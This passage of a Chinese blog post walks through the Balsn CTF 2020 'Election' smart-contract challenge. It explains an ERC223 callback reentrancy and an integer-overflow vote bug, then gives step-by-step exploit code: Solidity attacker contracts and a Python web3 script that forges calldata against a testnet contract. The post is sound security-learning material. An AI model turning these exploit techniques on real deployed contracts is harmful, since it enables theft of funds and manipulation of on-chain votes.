&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Helper functions */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_setup</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">auth</span> </span>&#123;</span><br><span class="line">        address Alice = address(<span class="number">0x9453</span>);</span><br><span class="line">        address Bob = address(<span class="number">0x9487</span>);</span><br><span class="line">        _setStage(<span class="number">0</span>);</span><br><span class="line">        propose(Alice, Proposal(<span class="string">"Alice"</span>, <span class="string">"This is Alice"</span>, <span class="literal">true</span>));</span><br><span class="line">        propose(Bob, Proposal(<span class="string">"Bob"</span>, <span class="string">"This is Bob"</span>, <span class="literal">true</span>));</span><br><span class="line">        voteCount[Alice] = uint(<span class="number">-0x9453</span>);</span><br><span class="line">        voteCount[Bob] = uint(<span class="number">-0x9487</span>);</span><br><span class="line">        _setStage(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_setStage</span>(<span class="params">uint _stage</span>) <span class="title">public</span> <span class="title">auth</span> </span>&#123;</span><br><span class="line">        stage = _stage &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_stringCompare</span>(<span class="params">string memory a, string memory b</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(a)) == keccak256(abi.encodePacked(b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>源码拿到手看起来比较长，从第一眼开始就出现了非常多不太熟的东西。</p>
+<p>首先是<a href="https://docs.soliditylang.org/en/latest/contracts.html#inheritance" target="_blank" rel="noopener">继承</a>，<code>Solidity</code>和<code>C++</code>一样允许多继承。</p>
+<p>然后就是接口关键字<a href="https://docs.soliditylang.org/en/latest/contracts.html#interfaces" target="_blank" rel="noopener">interface</a>，接口其实就是更加严格的抽象类，并且接口自己不能够实现任何具体的函数，所有函数的可视范围都必须是external。理解成一个基类就可以了。</p>
+<p>Solidity不允许自动覆盖父类成员或者函数，必须要手动使用override关键字指明；只有标为virtual的函数可以被子类覆盖。</p>
+<p>认识了一个新的标准<a href="https://github.com/ethereum/EIPs/issues/223" target="_blank" rel="noopener">ERC233</a>，这个ERC233特别之处在于允许转账发起方去调用转账接受方的一个任意的方法。emmm这就让我想到了可以重入合约自身了。不过限制肯定是有的，就是要自己手动布局calldata的位置。重入用到的代码片段：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">	address to, </span></span></span><br><span class="line"><span class="function"><span class="params">	uint value, </span></span></span><br><span class="line"><span class="function"><span class="params">	bytes memory data, </span></span></span><br><span class="line"><span class="function"><span class="params">	string memory customFallback -&gt; string for function selector to call</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">public</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> _transfer(msg.sender, to, value, data, customFallback);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_transfer</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">	address from, </span></span></span><br><span class="line"><span class="function"><span class="params">	address to, </span></span></span><br><span class="line"><span class="function"><span class="params">	uint value, </span></span></span><br><span class="line"><span class="function"><span class="params">	bytes memory data, </span></span></span><br><span class="line"><span class="function"><span class="params">	string memory customFallback</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">internal</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="keyword">from</span> != address(<span class="number">0</span>), <span class="string">"ERC223: transfer from the zero address"</span>);</span><br><span class="line">    <span class="built_in">require</span>(to != address(<span class="number">0</span>), <span class="string">"ERC223: transfer to the zero address"</span>);</span><br><span class="line">    <span class="built_in">require</span>(_balances[<span class="keyword">from</span>] &gt;= value, <span class="string">"ERC223: transfer amount exceeds balance"</span>);</span><br><span class="line">    _balances[<span class="keyword">from</span>] -= value;</span><br><span class="line">    _balances[to] += value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_isContract(to)) &#123;  <span class="comment">// to : this</span></span><br><span class="line">        (bool success,) = to.call&#123;<span class="attr">value</span>: <span class="number">0</span>&#125;(</span><br><span class="line">            abi.encodeWithSignature(customFallback, msg.sender, value, data)</span><br><span class="line">        );</span><br><span class="line">        assert(success);</span><br><span class="line">    &#125;</span><br><span class="line">    emit Transfer(msg.sender, to, value, data);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了调用giveMeFlag函数，必须要自己成为winner，也就是需要propose自己并且让自己获得最多的选票。</p>
+<p>除了使用重入之外还需要配合reveal函数中的一个整数溢出漏洞，获得<code>uint(-1)</code>的选票从而成为winner。</p>
+<h1 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h1><ol>
+<li>准备三个后缀的账户：<strong>0x00(for propose)</strong> 0x01(for vote) <strong>0x02(for reveal)</strong> <strong>0x03(for getwinner)</strong>, 默认的状态是0x01，所以1这个账户就不用准备了。</li>
+<li>让attacker拥有至少0x40的token，调用giveMeMoney函数然后使用transfer转给attacker即可，循环0x40次。</li>
+<li>趁着state为1的状态先构造好Ballots的hash，Ballot是一个两个元素的数组，第一个地址为attacker，votes为0xffff..fff，第二个地址为0（随便填），votes为1，计算好这个结构的hash值。用attacker去vote就可以。</li>
+<li>构造payload去调用一次propose，把attacker propose成一个合法的candidate，需要提前将state置为0,</li>
+<li>改变state的状态的话用先前准备好的3个账户去调用transfer即可，value置为0即可，不需要提前持有token。</li>
+<li>把状态重置为0，调用propose</li>
+<li>改变至状态2，调用reveal</li>
+<li>改变至状态3，调用getwinner</li>
+</ol>
+<h2 id="准备账户"><a href="#准备账户" class="headerlink" title="准备账户"></a>准备账户</h2><p>生成指定后缀的账户</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> blocksmith</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> keccak</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    kg = blocksmith.KeyGenerator()</span><br><span class="line">    kg.seed_input(<span class="string">''</span>)</span><br><span class="line">    key = kg.generate_key()</span><br><span class="line">    address = blocksmith.EthereumWallet.generate_address(key)</span><br><span class="line">    checksum_address = blocksmith.EthereumWallet.checksum_address(address)</span><br><span class="line">    <span class="keyword">if</span> checksum_address[<span class="number">-2</span>:] == <span class="string">'03'</span>:</span><br><span class="line">        print(checksum_address)</span><br><span class="line">        print(key)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>目标合约 <code>0xb058c67D419c02824b5e4300aE7b07562C217f21</code> (rinkeby)</p>
+<p>Attacker <code>0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</code></p>
+<p>不同后缀的账户用来切换状态：</p>
+<ul>
+<li><code>0xD5dc41C62F613028812F73dD8C1912DEaD529e00</code></li>
+<li><code>0x0e68B1f3bFFFa170384614D1AFd0Ea3e119B6502</code></li>
+<li><code>0x705cb7BaeE83E1bA572d4Ff1E9c56319e65Eb003</code></li>
+</ul>
+<h2 id="为Attacker筹集足够的ELC-tokens"><a href="#为Attacker筹集足够的ELC-tokens" class="headerlink" title="为Attacker筹集足够的ELC tokens"></a>为Attacker筹集足够的ELC tokens</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">struct Ballot &#123;</span><br><span class="line">    address candidate;</span><br><span class="line">    uint votes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Election &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">transfer</span>(<span class="params">address to, uint value, bytes memory data, string memory customFallback</span>) <span class="title">external</span>  <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">giveMeMoney</span>(<span class="params"></span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">vote</span>(<span class="params">bytes32 voteHash</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">uint</span>);</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">reveal</span>(<span class="params">uint voteHashID, Ballot[] memory ballots</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Hacker</span> </span>&#123;</span><br><span class="line">    Election target = Election(<span class="number">0xb058c67D419c02824b5e4300aE7b07562C217f21</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">       <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i ++) &#123;</span><br><span class="line">           target.giveMeMoney();</span><br><span class="line">           target.transfer(attacker, <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="在默认状态下Vote-for-Attacker"><a href="#在默认状态下Vote-for-Attacker" class="headerlink" title="在默认状态下Vote for Attacker"></a>在默认状态下Vote for Attacker</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker2 &#123;</span><br><span class="line">    Election target = Election(<span class="number">0xb058c67D419c02824b5e4300aE7b07562C217f21</span>);</span><br><span class="line">    address attacker = <span class="number">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        Ballot[] memory ballots = <span class="keyword">new</span> Ballot[](<span class="number">2</span>);</span><br><span class="line">        ballots[<span class="number">0</span>].candidate = attacker;</span><br><span class="line">        ballots[<span class="number">0</span>].votes = uint(int(<span class="number">-1</span>));</span><br><span class="line">        ballots[<span class="number">1</span>].candidate = address(<span class="number">0x0</span>);</span><br><span class="line">        ballots[<span class="number">1</span>].votes = <span class="number">1</span>;</span><br><span class="line">        bytes32 res = keccak256(abi.encode(ballots));</span><br><span class="line">        <span class="built_in">require</span>(res == hex<span class="string">'bbb3905b8070ae07179c384b0a2a5eb3d9c89091e5091188a7afc1049ff12fae'</span>, <span class="string">"0ops something wrong !"</span>);</span><br><span class="line">        target.vote(res);</span><br><span class="line">        selfdestruct(payable(attacker));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="切换至状态0，propose"><a href="#切换至状态0，propose" class="headerlink" title="切换至状态0，propose"></a>切换至状态0，propose</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3.auto.infura.rinkeby <span class="keyword">import</span> w3</span><br><span class="line"><span class="keyword">from</span> eth_abi <span class="keyword">import</span> encode_abi</span><br><span class="line"></span><br><span class="line"><span class="comment"># private = 'ommited ^ ^'</span></span><br><span class="line">public = <span class="string">'0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F'</span></span><br><span class="line">target = <span class="string">'0xb058c67D419c02824b5e4300aE7b07562C217f21'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_txn</span><span class="params">(src, dst, data, value=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">"from"</span>: src,</span><br><span class="line">        <span class="string">"to"</span>: dst,</span><br><span class="line">        <span class="string">"gasPrice"</span>: w3.toWei(<span class="number">1</span>,<span class="string">'gwei'</span>),</span><br><span class="line">        <span class="string">"gas"</span>: <span class="number">0x32185</span>,</span><br><span class="line">        <span class="string">"value"</span>: w3.toWei(value,<span class="string">'wei'</span>),</span><br><span class="line">        <span class="string">"nonce"</span>: w3.eth.getTransactionCount(src),</span><br><span class="line">        <span class="string">"data"</span>: data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">to = target</span><br><span class="line">value = <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># contruct data</span></span><br><span class="line">slot0 = <span class="string">b'\x01'</span>.rjust(<span class="number">0x20</span>,<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">name  = <span class="string">b'Ainevsia'</span></span><br><span class="line">slot1 = len(name).to_bytes(<span class="number">1</span>,<span class="string">'little'</span>).rjust(<span class="number">0x20</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">slot2 = name.ljust(<span class="number">0x20</span>,<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">slogan= <span class="string">b'Give me the flag, please'</span></span><br><span class="line">slot3 = len(slogan).to_bytes(<span class="number">1</span>,<span class="string">'little'</span>).rjust(<span class="number">0x20</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">slot4 = slogan.ljust(<span class="number">0x20</span>,<span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">data=(slot0+slot1+slot2+slot3+slot4)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(data) == <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">customFallback = <span class="string">"propose(address,(string,string,bool))"</span></span><br><span class="line">parm = encode_abi([<span class="string">'address'</span>, <span class="string">'uint256'</span>, <span class="string">'bytes'</span>, <span class="string">'string'</span>], [to, value, data, customFallback])</span><br><span class="line"></span><br><span class="line">sel = w3.keccak(<span class="string">b'transfer(address,uint256,bytes,string)'</span>)[:<span class="number">4</span>]</span><br><span class="line">data = sel + parm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">signed_txn = w3.eth.account.signTransaction(get_txn(public, target, data), private)</span><br><span class="line">txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()</span><br><span class="line">print(txn_hash)</span><br><span class="line">txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)</span><br><span class="line">print(txn_receipt)</span><br><span class="line">print(<span class="string">'[+] OK'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="切换至状态2，reveal-votes"><a href="#切换至状态2，reveal-votes" class="headerlink" title="切换至状态2，reveal votes"></a>切换至状态2，reveal votes</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">contract Hacker3 &#123;</span><br><span class="line">    Election target = Election(<span class="number">0xb058c67D419c02824b5e4300aE7b07562C217f21</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        Ballot[] memory ballots = <span class="keyword">new</span> Ballot[](<span class="number">2</span>);</span><br><span class="line">        ballots[<span class="number">0</span>].candidate = <span class="number">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;</span><br><span class="line">        ballots[<span class="number">0</span>].votes = uint(int(<span class="number">-1</span>));</span><br><span class="line">        ballots[<span class="number">1</span>].candidate = address(<span class="number">0x0</span>);</span><br><span class="line">        ballots[<span class="number">1</span>].votes = <span class="number">1</span>;</span><br><span class="line">        bytes32 res = keccak256(abi.encode(ballots));</span><br><span class="line">        <span class="built_in">require</span>(res == hex<span class="string">'bbb3905b8070ae07179c384b0a2a5eb3d9c89091e5091188a7afc1049ff12fae'</span>);</span><br><span class="line">        target.reveal(<span class="number">0</span>, ballots);</span><br><span class="line">        selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="切换至状态3，getwiner"><a href="#切换至状态3，getwiner" class="headerlink" title="切换至状态3，getwiner"></a>切换至状态3，getwiner</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>涉及到ABI，还需要多多熟悉才能掌握。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>    
+    
+      
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+              <strong>本文作者：</strong>Ainevsia
+          </li>
+          <li class="post-copyright-link">
+            <strong>本文链接：</strong>
+            <a href="/2021/04/07/BalsnCTF2020-Election/" title="Balsn CTF 2020 - Election 复现笔记">https://ainevsia.github.io/2021/04/07/BalsnCTF2020-Election/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明： </strong>
+            本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！
+          </li>
+        </ul>
+      
+    </div>
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Blockchian-CTF/" rel="tag"># Blockchian CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/30/2021VolgaCTF/" rel="next" title="2021VolgaCTF">
+                <i class="fa fa-chevron-left"></i> 2021VolgaCTF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://avatars2.githubusercontent.com/u/31178818?s=400&u=04fe60fc9fd9e159806f4c2363ab9a4da748bf84&v=4" alt="Ainevsia">
+            
+              <p class="site-author-name" itemprop="name">Ainevsia</p>
+              <p class="site-description motion-element" itemprop="description">Personal Blog</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">43</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">22</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ainevsia" title="GitHub &rarr; https://github.com/ainevsia" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zhipengxu@sjtu.edu.cn" title="E-Mail &rarr; mailto:zhipengxu@sjtu.edu.cn" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/u/2852659417" title="Weibo &rarr; https://weibo.com/u/2852659417" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://raw.githubusercontent.com/Ainevsia/Ainevsia.github.io/master/PGP-Public-Key.txt" title="PGP-Key &rarr; https://raw.githubusercontent.com/Ainevsia/Ainevsia.github.io/master/PGP-Public-Key.txt" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>PGP-Key</a>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                我的朋友们
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zhaobairen.club/" title="http://zhaobairen.club/" rel="noopener" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://rooki3ray.github.io/" title="https://rooki3ray.github.io/" rel="noopener" target="_blank">rooki3ray</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://entropy2333.xyz/" title="https://entropy2333.xyz/" rel="noopener" target="_blank">entropy2333</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://schenk75.github.io/" title="https://schenk75.github.io/" rel="noopener" target="_blank">schenk75</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://thomas-li-sjtu.github.io/" title="https://thomas-li-sjtu.github.io/" rel="noopener" target="_blank">thomas-li-sjtu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Balsn-CTF-2020-Election"><span class="nav-number">1.</span> <span class="nav-text">Balsn CTF 2020 - Election</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Source"><span class="nav-number">2.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#源码分析"><span class="nav-number">3.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击步骤"><span class="nav-number">4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备账户"><span class="nav-number">4.1.</span> <span class="nav-text">准备账户</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为Attacker筹集足够的ELC-tokens"><span class="nav-number">4.2.</span> <span class="nav-text">为Attacker筹集足够的ELC tokens</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在默认状态下Vote-for-Attacker"><span class="nav-number">4.3.</span> <span class="nav-text">在默认状态下Vote for Attacker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#切换至状态0，propose"><span class="nav-number">4.4.</span> <span class="nav-text">切换至状态0，propose</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#切换至状态2，reveal-votes"><span class="nav-number">4.5.</span> <span class="nav-text">切换至状态2，reveal votes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#切换至状态3，getwiner"><span class="nav-number">4.6.</span> <span class="nav-text">切换至状态3，getwiner</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ainevsia</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
